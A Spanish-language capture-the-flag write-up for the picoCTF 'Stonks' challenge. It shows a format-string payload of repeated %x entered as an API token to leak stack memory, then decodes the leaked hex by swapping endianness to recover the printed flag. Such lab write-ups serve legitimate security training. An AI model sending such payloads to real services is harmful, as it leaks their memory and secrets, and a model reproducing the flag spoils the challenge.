## Descripción
I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! [vuln.c](https://mercury.picoctf.net/static/7e71fc0d8cc3339bfad6bf408f7dc510/vuln.c) `nc mercury.picoctf.net 6989`

## Solución
Accedemos al programa, seleccionamos la primera opción y aprovecharemos de la vulnerabilidad string formatting.

Ya que el método buy_stonks(Portfolio p), no contiene maneras seguras de manejar strings, podemos hacer que este nos retorne cadenas hexadecimales que pueden contener la bandera.

Una vez obtenida la cadena y convertida a ASCII, notamos que hay una cadena similar a la bandera, pero invertida.

ocip{FTC0l_I4_t5m_ll0m_y_y3n58a025e3ÿ¡ }

Extraemos el hex equivalente utilizando cyberchef:
6f 63 69 70 7b 46 54 43 30 6c 5f 49 34 5f 74 35 6d 5f 6c 6c 30 6d 5f 79 5f 79 33 6e 35 38 61 30 32 35 65 33 ff a1 0a

Aplicamos swap endianness:
70 69 63 6f 43 54 46 7b 49 5f 6c 30 35 74 5f 34 6c 6c 5f 6d 79 5f 6d 30 6e 33 79 5f 30 61 38 35 33 65 35 32 00 0a a1 ff

De hex a ACII:
picoCTF{I_l05t_4ll_my_m0n3y_0a853e52 
¡ÿ

Corregimos:
picoCTF{I_l05t_4ll_my_m0n3y_0a853e52}

```bash
alberto@Nova:~/Descargas$ nc mercury.picoctf.net 6989
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
Buying stonks with token:
8d5a430804b00080489c3f7f72d80ffffffff18d58160f7f80110f7f72dc708d5918018d5a4108d5a4306f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e3538613032356533ffa1007df7fadaf8f7f80440104130010f7e0fce9f7f810c0f7f725c0f7f72000ffa182f8f7e0068df7f725c08048ecaffa183040f7f94f09804b000f7f72000f7f72e20ffa18338f7f9ad50f7f738901041300f7f72000804b000ffa183388048c868d58160ffa18324ffa183388048be9f7f723fc0ffa183ecffa183e4118d581601041300ffa1835000f7db5fa1f7f72000f7f720000
Portfolio as of Wed May 31 03:24:03 UTC 2023
```


## Notas Adicionales
|comando|descripcion|
|---|---|
|xx|xx|

## Referencias
- [Endianness](https://en.wikipedia.org/wiki/Endianness)
